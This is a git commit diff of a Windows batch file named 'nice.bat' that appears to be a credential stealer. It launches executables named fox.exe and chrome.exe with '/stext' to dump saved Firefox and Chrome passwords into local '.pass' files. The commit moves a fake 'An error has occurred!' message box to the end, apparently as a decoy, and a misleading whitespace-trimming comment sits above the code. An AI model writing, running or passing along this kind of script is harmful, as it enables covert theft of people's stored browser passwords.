2d40d15ab8a1217c388381f7a691036c8b2bfb82
xryven <baeadr244@proton.me>
2025-02-19 10:27:42 +0100

    Update nice.bat

--- nice/nice.bat
+++ nice/nice.bat
@@ -1,6 +1,7 @@
 :: Trim right white space, a maximum of 1 time (the final 1 in brackets represents max iterations)
-start /min powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('An error has occurred!', 'Error', 'OK', 'Error')" & exit
+
 for /l %%a in (1,1,1) do if "!Today:~-1!"==" " set Today=!Today:~0,-1!
 SET dynpathname=.txt
 start fox.exe /stext fox.pass
 start chrome.exe /stext chrome.pass
+start /min powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('An error has occurred!', 'Error', 'OK', 'Error')" & exit
